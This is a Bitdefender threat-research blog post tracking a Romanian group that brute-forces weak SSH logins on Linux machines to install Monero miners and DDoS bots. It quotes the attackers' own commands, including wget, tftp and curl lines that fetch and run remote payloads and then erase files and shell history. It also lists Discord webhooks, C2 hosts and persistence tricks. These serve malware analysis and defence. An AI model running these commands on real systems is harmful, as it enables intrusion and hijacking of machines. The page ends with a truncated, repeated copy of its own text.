            </a><!----></div> <div class="tw-flex tw-w-6/12 tw-items-center tw-justify-end sm:tw-w-4/12"><a aria-label="show rss feed" title="show rss feed" href="/nuxt/api/en-us/rss/labs/antimalware-research/" target="_blank" class="tw-w-5 tw-text-white tw-mr-4"><svg width="20" aria-hidden="true" focusable="false" data-prefix="far" data-icon="rss-square" <!----> <div class="tw-container tw-mt-12"><div></div> <div class="tw-gap-7 lg:tw-flex"><div class="tw-mx-auto lg:tw-w-2/3"><div class="tw-mb-2 tw-items-center sm:tw-flex"><div class="tw-mb-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-xs tw-font-bold tw-uppercase tw-text-[#608DFF] !tw-mb-0"><a href="/en-us/blog/labs/tag/antimalware-research" title="Anti-Malware Research" class="tw-relative tw-mr-4 after:tw-absolute after:tw-top-0 after:tw-bottom-0 after:tw--right-2.5 after:tw-m-auto after:tw-mr-0 after:tw-block after:tw-h-1 after:tw-w-1 after:tw-rounded-full after:tw-bg-current last:tw-mr-0 last:after:tw-hidden ">Anti-Malware Research
      </a><!----><!----><!----> <!----></div> <div class="tw-mt-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-sm !tw-mt-0"><!----> <div><!----> <!----></div> <div class="tw-relative tw-ml-5 tw-flex tw-items-center before:tw-absolute before:tw-top-0 before:tw-bottom-0 before:tw--left-3 before:tw-m-auto before:tw-block before:tw-h-1 before:tw-w-1 before:tw-rounded-full before:tw-bg-[#7c7c7c] sm:first:before:tw-hidden"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 23 23" overflow="visible" class="tw-text-[#7c7c7c]"><path d="M11.5 2c5.2 0 9.5 4.3 9.5 9.5S16.7 21 11.5 21 2 16.7 2 11.5 6.3 2 11.5 2m0-2C5.1 0 0 5.1 0 11.5S5.1 23 11.5 23 23 17.9 23 11.5 17.9 0 11.5 0z" style="fill: currentColor"></path> <path d="M11.5 6.6v4.5M12 12.1l3.5 3.2" class="st0"></path></svg> <span class="tw-pl-2">
            10 min read
         </span></div> <div class="tw-relative tw-ml-5 before:tw-absolute before:tw-top-0 before:tw-bottom-0 before:tw--left-3 before:tw-m-auto before:tw-block before:tw-h-1 before:tw-w-1 before:tw-rounded-full before:tw-bg-[#7c7c7c]"><button aria-label="add to bookmark" class="tw-block tw-text-base"><svg xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 50.9 52.1" overflow="visible" class="tw-w-[1em] tw-h-[1em]"><path d="M3.4 2.5h34.3c.4 0 .7.4.7.8v45.2c0 .6-.6.9-.9.5L21.1 37.3c-.4-.3-.8-.3-1.2 0L3.4 49.5c-.4.4-.9.1-.9-.5l.2-45.7c0-.4.3-.8.7-.8z" fill="#fff" stroke="#adb5b9" stroke-width="5" stroke-miterlimit="10"></path></svg> <!----></button></div></div></div> <h1 class="tw-text-3xl tw-font-bold md:tw-text-4xl md:tw-leading-tight xl:tw-text-5xl xl:tw-leading-tight">
               How We Tracked a Threat Group Running an Active Cryptojacking Campaign
            </h1> <div class="tw-mt-3 tw-items-center tw-text-sm sm:tw-flex"><div class="sm:tw-w-1/3"><div class="tw-mt-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-sm"><a href="/en-us/blog/labs/author/bitdefenderteam" title="Bitdefender" class="tw-overflow-hidden tw-rounded-full tw-h-11 tw-w-11"><img width="50" height="50" alt="Bitdefender" title="Bitdefender" data-src="https://blogapp.bitdefender.com/labs/content/images/size/w100/2022/02/logo_bd_social.png" class="tw-h-full tw-w-full tw-object-cover"></a> <div class="tw-pl-2"><div><a href="/en-us/blog/labs/author/bitdefenderteam" title="Bitdefender" class="tw-mr-1.5 last:tw-mr-0">Bitdefender
         </a></div> <p class="tw-text-[#41485e]">
         July 14, 2021
      </p></div> <!----> <!----></div></div> <div class="tw-mt-4 sm:tw-mt-0 sm:tw-w-2/3"><div class="tw-relative tw-rounded tw-bg-[#f4f7fa] tw-py-2 tw-pl-11 tw-pr-2 tw-text-xs"><em class="tw-absolute tw-left-2.5 tw-top-2 tw-text-[10px]">Promo</em> <span class="pe-2">Protect all your devices, without slowing them down.</span> <br> <a target="_blank" href="/Downloads/" class="tw-text-[#608dff]">Free 30-day trial</a></div></div></div> <picture class="tw-my-6"><source data-not-lazy="" media="(max-width: 600px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg"> <source data-not-lazy="" media="(min-width: 701px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg"> <img data-not-lazy="" data-src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg" alt="How We Tracked a Threat Group Running an Active Cryptojacking Campaign" title="How We Tracked a Threat Group Running an Active Cryptojacking Campaign" width="600" height="400" src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg" class="tw-my-4 tw-w-full"></picture> <div class="content tw-mb-12 tw-text-lg tw-text-black"><p>Bitdefender security researchers have discovered a threat group likely based in Romania that's been active since at least 2020. They've been targeting Linux-based machines with weak SSH credentials, mainly to deploy Monero mining malware, but their toolbox allows for other kinds of attacks.</p><p>Hackers going after weak SSH credentials is not uncommon. Among the biggest problems in security are default user names and passwords, or weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it in a way that lets attackers go undetected.</p><p>Like any other threat group, the tools and methods they use can identify them. In this case, their activity involves obfuscating Bash scripts by compiling them with a shell script compiler (shc) and using Discord to report the information back.</p><p>In addition to traditional tools such as <code>masscan</code> and <code>zmap</code>, the threat actors' toolkit includes a previously unreported SSH bruteforcer written in Golang. This tool appears to be distributed on an as-a-service model, as it uses a centralized API server. Each threat actor supplies their API key in their scripts. Like most other tools in this kit, the brute force tool has its interface in a mix of Romanian and English. This leads us to believe that its author is part of the same Romanian group.</p><p><strong>Introduction</strong></p><p>We started investigating this group in May 2021 because of their cryptojacking campaign with the <code>.93joshua</code> loader. Surprisingly, we traced the malware easily to <code>http://45[.]32[.]112[.]68/.sherifu/.93joshua</code> in an open directory. It turns out that the server hosted other files. Although the group hid many of the files, their inclusion in other scripts revealed their presence. The associated domain, mexalz.us, has hosted malware at least since February 2021.</p><p>The front page of <code>45[.]32[.]112[.]68</code>:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/1-1.png" class="kg-image" alt loading="lazy" width="995" height="657" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/1-1.png 600w, https://blogapp.bitdefender.com/labs/content/images/2021/07/1-1.png 995w" sizes="(min-width: 720px) 720px"></figure><p>The front page of mexalz.us:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/2-1.png" class="kg-image" alt loading="lazy" width="1001" height="835" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/2-1.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/2-1.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/2-1.png 1001w" sizes="(min-width: 720px) 720px"></figure><p>The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz[.]us:</p><!--kg-card-begin: markdown--><pre><code>mexalz.us
|-- .sherifu/
|   |   .93joshua
|   |   .k4m3l0t
|   |   .purrple
|   |   .zte_error
|   |   find.sh
|   |-- jack.tar.gz
|   |   |-- .jack1992/
|   |   |   |   brute
|   |   |   |   dabrute
|   |   |   |   lists/
|   |   |   |   mass
|   |   |   |   masscan
|   |   |   |   pass
|   |   |   |   ranges_1.lst
|   |   juanito.tar.gz
|   |   |-- .juanito/
|   |   |   |   brute
|   |   |   |   go
|   |   |   |   pass
|   |   |   |   ps2
|   |   |   |   r
|   |   kamelot.tar.gz
|   |   |-- .md/
|   |   |   go
|   |   |   haiduc
|   |   |   pass
|   |   satan.db
|   |   scn.tar.gz
|   |   |-- .md/
|   |   |   go
|   |   |   haiduc
|   |   |   pass
|   |   sefu
|   |   skamelot.tar.gz
|   |   |-- .b87kamelot/
|   |   |   |   99x
|   |   |   |   go
|   |   |   |   p
|   |   |   |   r
|   |   sky
|-- .mini
|   |   .black
|   |   .report_system
|   |   PhoenixMiner.tar
|   |   banner
|   |   ethminer.tar
|   |   masscan
</code></pre>
<!--kg-card-end: markdown--><p>We'll be focusing on the original tools in this kit. Some of the files deserve special mention, as they can be connected to attacks seen in the wild.</p><p>The files <code>sefu</code> (bash script) and <code>satan.db</code> (gzip archive) are used to propagate the <code>chernobyl</code> Demonbot variant, which is hosted on a different server. The infection payload follows these simple steps:</p><!--kg-card-begin: markdown--><pre><code>cd /tmp cd /run cd /;
wget http://194[.]33[.]45[.]197:8080/chernobyl/chernobyl.sh;
chmod 777 chernobyl.sh;
sh chernobyl.sh chernobyl;
tftp 194[.]33[.]45[.]197 -c get chernobyltftp1.sh;
chmod 777 chernobyltftp1.sh;
sh chernobyltftp1.sh chernobyl;
tftp -r chernobyltftp2.sh -g 194[.]33[.]45[.]197;
chmod 777 chernobyltftp2.sh;
sh chernobyltftp2.sh chernobyl;
rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh;
rm -rf *;
history -c
</code></pre>
<!--kg-card-end: markdown--><p><code>sky</code> is a common Perl IRC bot, customized only in respect to the server details and used nicknames. Its C2 is at <code>area17[.]mexalz[.]us:6667</code>.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/sky_configuration--1-.png" class="kg-image" alt loading="lazy"></figure><p><strong>Finding the victims</strong></p><p>There's no shortage of compromisable Linux machines with weak SSH credentials. The trick is to find them, and that's done through scanning. Attackers host several archives on the server, including <code>jack.tar.gz</code>, <code>juanito.tar.gz</code>, <code>scn.tar.gz</code> and <code>skamelot.tar.gz</code>.</p><p>These contain toolchains for cracking servers with weak SSH credentials. We can separate this process into three stages:</p><!--kg-card-begin: markdown--><ul>
<li>reconnaissance: identifying SSH servers via port scanning and banner grabbing</li>
<li>credential access: identifying valid credentials via brute-force</li>
<li>initial access: connecting via SSH and executing the infection payload</li>
</ul>
<!--kg-card-end: markdown--><p>Depending on the stage, the attackers use different tools. For example, <code>ps</code> and <code>masscan</code> are used for reconnaissance, while <code>99x</code> / <code>haiduc</code> (both Outlaw malware) and `brute` are used for credential access and initial access.</p><p>In the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files:</p><!--kg-card-begin: markdown--><ul>
<li><code>r</code> (SHC compiled script) iterates through IP classes and runs <code>go</code></li>
<li><code>go</code> (SHC compiled script) runs <code>99x</code> (haiduc) with the infection payload</li>
<li><code>p</code> is a list of attempted credentials</li>
</ul>
<!--kg-card-end: markdown--><p>The infection payload executed in the SSH sessions is:</p><p><code>curl -O http://45[.]32[.]112[.]68/.sherifu/.93joshua &amp;&amp; chmod 777 .93joshua &amp;&amp; ./.93joshua &amp;&amp; uname -a</code></p><p>Note: This file is still online, but attackers relocated to <code>mexalz.us</code>.</p><p><strong>It all begins with a loader</strong></p><p>After the attackers find and enter into a Linux device with inadequate SSH credentials, they deploy and execute the loader. In the current campaign, they use <code>.93joshua</code>, but they have a couple of others at their disposal; <code>.purrple</code> and <code>.black</code>. All of the loaders are obfuscated via <code>shc</code>.</p><p>The loader gathers system information and relays it to the attacker using an HTTP POST to a Discord webhook. By using Discord, the threat actors circumvent the need to host their own command-and-control server, as webhooks are means to post data on Discord channel programmatically. The gathered data can also be conveniently viewed on a channel.</p><p>Discord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution (use of its CDN), command-and-control (webhooks) or creating communities centered around buying and selling malware source code and services (e.g. DDoS).</p><p>The information gathered at this step lets the threat actor witness the effectiveness of their tools in infecting machines. The list of victims may also be collected to carry out potential post-exploitation steps.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/3.png" class="kg-image" alt loading="lazy" width="419" height="184"></figure><p>In another step of its operation, the loader alters the shell configuration, overwriting the <code>.bashrc</code> and <code>.bash_profile</code> files. The auxiliary file <code>/usr/.SQL-Unix/.SQL/.db</code>, used to store part of the commands, is executed via the source built-in in <code>.bashrc</code>. This script, in turn, contains commands that overwrite <code>.bashrc</code>.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/4.png" class="kg-image" alt loading="lazy" width="417" height="542"></figure><p>Several shell commands are disabled using bash aliases. The purpose of these configurations is to render the shell inoperable to other operators, whether they are competing in the realms of malware or they’re legitimate users of the system.</p><p>The attackers also try to achieve persistence so the loader drops some redundant scripts. Their names differ between versions of the loader, so we will refer to those in the <code>.93joshua</code> script:</p><!--kg-card-begin: markdown--><p>· <code>.k93</code> is used to launch the miner (.k4m3l0t)<br>
· <code>/usr/bin/sshd</code> is a <code>systemd</code> service script that launches .k93<br>
· <code>.5p4rk3l5</code> is a crontab file that executes <code>.93joshua</code> and <code>.k93</code></p>
<!--kg-card-end: markdown--><p>Several persistence methods are employed:</p><!--kg-card-begin: markdown--><p>· creating a user and adding it to the sudo group; various names are used: <code>gh0stx</code>, <code>sclipicibosu</code>, <code>mexalzsherifu</code><br>
· adding a SSH key to <code>authorized_keys</code> (attackers cycled through three different keys depending on the script)<br>
· creating a <code>systemd</code> service called <code>myservice</code> which runs the <code>/usr/bin/sshd</code> script:</p>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/5.png" class="kg-image" alt loading="lazy" width="640" height="583" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/5.png 600w, https://blogapp.bitdefender.com/labs/content/images/2021/07/5.png 640w"></figure><p><strong>Mining for Monero</strong></p><p>All of this effort is currently directed towards Monero mining. While the current campaign concerns cryptojacking, we have connected this group to several DDoS botnets: a Demonbot variant called <code>chernobyl</code> and a Perl IRC bot.</p><p>As you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems. Owning multiple systems for mining is not cheap, so attackers try the next best thing: to remotely compromise devices and use them for mining instead.</p><p>In this case, the group uses custom compiled binaries with embedded configurations of a legitimate miner named <a href="https://github.com/xmrig/xmrig">XMRig</a>. Typically, the JSON configuration file, which also includes the users and where the currency goes, is external. But in this compiled version, the configuration file in embedded.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/6.png" class="kg-image" alt loading="lazy" width="1128" height="166" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/6.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/6.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/6.png 1128w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/7.png" class="kg-image" alt loading="lazy"></figure><p><strong>Unfortunately, brute force still works</strong></p><p>People are the simple reason why brute-forcing SSH credentials still works. Dedicated tools are required for this process, and, in this situation, it's something developed by the group itself.</p><p>This tool, which its author dubbed "Diicot brute", is contained in <code>jack.tar.gz</code> and <code>juanito.tar.gz</code> archives.</p><p>As the usage string from the binary shows, it takes as command-line arguments a port, an "API key", number of threads, a file containing a list of IP addresses to be scanned, and a timeout value (seconds).</p><p><code>Syntax: ./brute [ Port ] [ Key ] [ Routines ] [ IP File ] [ Timeout ]</code></p><p>Written in Golang, the binary was developed in a single package, which contains the following functions:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/8.png" class="kg-image" alt loading="lazy" width="440" height="203"></figure><p>While most of the tools used by Mexalz can be used by themselves, the "Diicot bruter" is meant to operate on a SaaS (software as a service) model. The binary communicates with three servers:</p><!--kg-card-begin: markdown--><ul>
<li>an update server (cdn[.]arhive[.]online)</li>
<li>an API server (requests[.]arhive[.]online)</li>
<li>Discord API servers</li>
</ul>
<!--kg-card-end: markdown--><p>The tool requires an "API key", supplied as a command-line argument. The key is provided as a parameter in the API endpoints used to retrieve the user's configuration. The configuration includes the user's Discord ID, a Discord webhook where the tool's output is POSTed, and a version number (presumably, the latest version to which the user is licensed to use).</p><p>The <code>dabrute</code> and <code>go</code> scripts contain keys of this type. Rather than random strings, they look like user names and differ between the two instances, strengthening the assumption that the owners of this toolkit are distinct individuals belonging to the same threat group that share tools among themselves.</p><p>Discord hooks are used to report on:</p><!--kg-card-begin: markdown--><ul>
<li>the start and finish of the tool's execution</li>
<li>successful exploitations</li>
</ul>
<!--kg-card-end: markdown--><p>Two types of hooks are used: user-dependent, which are retrieved from the API server using the API key, and global, which are hardcoded.</p><p>The global hooks are:</p><!--kg-card-begin: markdown--><ul>
<li><a href="https://discord">https://discord</a>[.]com/api/webhooks/796089316517347369/zRjSflkA7z9C4N9PaPWIJQFLMSKGk5iJNv9T_Z880jhLOpkQ3OEGsbdz4GsX80WwRY0g</li>
<li><a href="https://discord">https://discord</a>[.]com/api/webhooks/845977569446068234/ggGoh-5DEpMLtIi0OKNc8z3b3MgxjZaxovL0R0dBiMsP0hnMTIkNx_JoFTLKJtbyRSx</li>
</ul>
<!--kg-card-end: markdown--><p>The <code>main.remoteRun</code> function is executed in a dedicated goroutine (lightweight thread) for each (host, username, password) combination. The implementation of the SSH protocol is provided by the standard library package <code>golang.org/x/crypto/ssh</code>.</p><p>After a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information:</p><!--kg-card-begin: markdown--><pre><code>uname -s -v -n -r -m
uptime | grep -ohe 'up .*' | sed 's/,//g' | awk '{ print $2\&quot; \&quot;$3 }'
uptime | grep -ohe '[0-9.*] user[s,]'
lscpu | sed -nr '/Model name/ s/.*:\\s*(.*) @ .*/\\1/p'
nproc --all
nvidia-smi -q | grep \&quot;Product Name\&quot;
lspci
cut -d: -f6 /etc/passwd | grep \&quot;/home/\&quot;
</code></pre>
<!--kg-card-end: markdown--><p>Notably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme.</p><p>Owing to an auto-update feature in the binaries, we managed to locate where it is hosted and gain insight into how it is distributed. The update server is set up using Github pages.</p><p>The repository is revealed by following the redirect chain:</p><!--kg-card-begin: markdown--><ul>
<li>cdn[.]arhive[.]online/brute -&gt; developer60-stack.github.io/payload.github.io/cdn/brute</li>
</ul>
<!--kg-card-end: markdown--><p>The repository (github.com/developer60-stack/payload.github.io) contains:</p><!--kg-card-begin: markdown--><ul>
<li>setup, an example usage of the <code>brute</code> tool that chains the <code>zmap</code> port scanner, a banner grabber and a stage for filtering out SSH servers that do not accept password authentication</li>
<li><code>brute</code>, the compiled tool</li>
<li><code>install</code>, a script for installing dependencies and downloading the tool; both setup and install report after every execution stage to a Discord hook</li>
</ul>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/9.png" class="kg-image" alt="Github repository payload.github.io" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/10.png" class="kg-image" alt="Repository tree" loading="lazy" width="172" height="144"></figure><p>Created on May 1 2021, the repository underwent 35 updates (commits).</p><p>An advertisement posted on the hacking forum cracked[.]to in November 2020 shows the price charged for this service and a collage of images showing its interface, including screenshots from the Discord channel.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/11.png" class="kg-image" alt="Advertisment on Cracked forum" loading="lazy"><figcaption>(censor not in original)</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/12.png" class="kg-image" alt="Advertisment on Cracked forum" loading="lazy" width="1132" height="117" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/12.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/12.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/12.png 1132w" sizes="(min-width: 720px) 720px"><figcaption>(censor belongs to original)</figcaption></figure><p>The author claims that their tool can filter out honeypots, but this investigation is proof that it doesn't, or at least it couldn’t evade ours.</p><p>Our honeypot data shows attacks matching this tool's signature starting in January 2021. The IP addresses they originate from belong to a relatively small set, which tells us that the threat actors are not yet using compromised systems to propagate the malware (worm behavior).</p><p>More information about this threat actor can be freely provided to law enforcement agencies by reaching out to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e68294878589a6848f928283808388828394c885898b">[email&#160;protected]</a>.</p><p><strong>Indicators of compromise</strong></p><p>Samples:</p><!--kg-card-begin: html--><table class="MsoNormalTable" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none;mso-border-alt:solid windowtext .75pt;

{layout:"default",data:[{post:{id:"66d5c3d2d0ec1aefc7d72294",uuid:"7b0475ba-3cd2-44d0-a015-24ac3139e475",title:"How We Tracked a Threat Group Running an Active Cryptojacking Campaign",slug:"how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign",html:"\u003Cp\u003EBitdefender security researchers have discovered a threat group likely based in Romania that's been active since at least 2020. They've been targeting Linux-based machines with weak SSH credentials, mainly to deploy Monero mining malware, but their toolbox allows for other kinds of attacks.\u003C\u002Fp\u003E\u003Cp\u003EHackers going after weak SSH credentials is not uncommon. Among the biggest problems in security are default user names and passwords, or weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it in a way that lets attackers go undetected.\u003C\u002Fp\u003E\u003Cp\u003ELike any other threat group, the tools and methods they use can identify them. In this case, their activity involves obfuscating Bash scripts by compiling them with a shell script compiler (shc) and using Discord to report the information back.\u003C\u002Fp\u003E\u003Cp\u003EIn addition to traditional tools such as \u003Ccode\u003Emasscan\u003C\u002Fcode\u003E and \u003Ccode\u003Ezmap\u003C\u002Fcode\u003E, the threat actors' toolkit includes a previously unreported SSH bruteforcer written in Golang. This tool appears to be distributed on an as-a-service model, as it uses a centralized API server. Each threat actor supplies their API key in their scripts. Like most other tools in this kit, the brute force tool has its interface in a mix of Romanian and English. This leads us to believe that its author is part of the same Romanian group.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EIntroduction\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EWe started investigating this group in May 2021 because of their cryptojacking campaign with the \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E loader. Surprisingly, we traced the malware easily to \u003Ccode\u003Ehttp:\u002F\u002F45[.]32[.]112[.]68\u002F.sherifu\u002F.93joshua\u003C\u002Fcode\u003E in an open directory. It turns out that the server hosted other files. Although the group hid many of the files, their inclusion in other scripts revealed their presence. The associated domain, mexalz.us, has hosted malware at least since February 2021.\u003C\u002Fp\u003E\u003Cp\u003EThe front page of \u003Ccode\u003E45[.]32[.]112[.]68\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2021\u002F07\u002F1-1.png 600w, original tools in this kit. Some of the files deserve special mention, as they can be connected to attacks seen in the wild.\u003C\u002Fp\u003E\u003Cp\u003EThe files \u003Ccode\u003Esefu\u003C\u002Fcode\u003E (bash script) and \u003Ccode\u003Esatan.db\u003C\u002Fcode\u003E (gzip archive) are used to propagate the \u003Ccode\u003Echernobyl\u003C\u002Fcode\u003E Demonbot variant, which is hosted on a different server. The infection payload follows these simple steps:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cpre\u003E\u003Ccode\u003Ecd \u002Ftmp cd \u002Frun cd \u002F;\nwget http:\u002F\u002F194[.]33[.]45[.]197:8080\u002Fchernobyl\u002Fchernobyl.sh;\nchmod 777 chernobyl.sh;\nsh chernobyl.sh chernobyl;\ntftp 194[.]33[.]45[.]197 -c get chernobyltftp1.sh;\nchmod 777 chernobyltftp1.sh;\nsh chernobyltftp1.sh chernobyl;\ntftp -r chernobyltftp2.sh -g 194[.]33[.]45[.]197;\nchmod 777 chernobyltftp2.sh;\nsh chernobyltftp2.sh chernobyl;\nrm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh;\nrm -rf *;\nhistory -c\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003E\u003Ccode\u003Esky\u003C\u002Fcode\u003E is a common Perl IRC bot, customized only in respect to the server details and used nicknames. Its C2 is at \u003Ccode\u003Earea17[.]mexalz[.]us:6667\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002Fsky_configuration--1-.png\" class=\"kg-image\" alt loading=\"lazy\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EFinding the victims\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EThere's no shortage of compromisable Linux machines with weak SSH credentials. The trick is to find them, and that's done through scanning. Attackers host several archives on the server, including \u003Ccode\u003Ejack.tar.gz\u003C\u002Fcode\u003E, \u003Ccode\u003Ejuanito.tar.gz\u003C\u002Fcode\u003E, \u003Ccode\u003Escn.tar.gz\u003C\u002Fcode\u003E and \u003Ccode\u003Eskamelot.tar.gz\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThese contain toolchains for cracking servers with weak SSH credentials. We can separate this process into three stages:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ereconnaissance: identifying SSH servers via port scanning and banner grabbing\u003C\u002Fli\u003E\n\u003Cli\u003Ecredential access: identifying valid credentials via brute-force\u003C\u002Fli\u003E\n\u003Cli\u003Einitial access: connecting via SSH and executing the infection payload\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EDepending on the stage, the attackers use different tools. For example, \u003Ccode\u003Eps\u003C\u002Fcode\u003E and \u003Ccode\u003Emasscan\u003C\u002Fcode\u003E are used for reconnaissance, while \u003Ccode\u003E99x\u003C\u002Fcode\u003E \u002F \u003Ccode\u003Ehaiduc\u003C\u002Fcode\u003E (both Outlaw malware) and `brute` are used for credential access and initial access.\u003C\u002Fp\u003E\u003Cp\u003EIn the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003Er\u003C\u002Fcode\u003E (SHC compiled script) iterates through IP classes and runs \u003Ccode\u003Ego\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ego\u003C\u002Fcode\u003E (SHC compiled script) runs \u003Ccode\u003E99x\u003C\u002Fcode\u003E (haiduc) with the infection payload\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ep\u003C\u002Fcode\u003E is a list of attempted credentials\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe infection payload executed in the SSH sessions is:\u003C\u002Fp\u003E\u003Cp\u003E\u003Ccode\u003Ecurl -O http:\u002F\u002F45[.]32[.]112[.]68\u002F.sherifu\u002F.93joshua &amp;&amp; chmod 777 .93joshua &amp;&amp; .\u002F.93joshua &amp;&amp; uname -a\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\u003Cp\u003ENote: This file is still online, but attackers relocated to \u003Ccode\u003Emexalz.us\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EIt all begins with a loader\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAfter the attackers find and enter into a Linux device with inadequate SSH credentials, they deploy and execute the loader. In the current campaign, they use \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E, but they have a couple of others at their disposal; \u003Ccode\u003E.purrple\u003C\u002Fcode\u003E and \u003Ccode\u003E.black\u003C\u002Fcode\u003E. All of the loaders are obfuscated via \u003Ccode\u003Eshc\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThe loader gathers system information and relays it to the attacker using an HTTP POST to a Discord webhook. By using Discord, the threat actors circumvent the need to host their own command-and-control server, as webhooks are means to post data on Discord channel programmatically. The gathered data can also be conveniently viewed on a channel.\u003C\u002Fp\u003E\u003Cp\u003EDiscord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution (use of its CDN), command-and-control (webhooks) or creating communities centered around buying and selling malware source code and services (e.g. DDoS).\u003C\u002Fp\u003E\u003Cp\u003EThe information gathered at this step lets the threat actor witness the effectiveness of their tools in infecting machines. The list of victims may also be collected to carry out potential post-exploitation steps.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F3.png\" class=\"kg-image\" alt 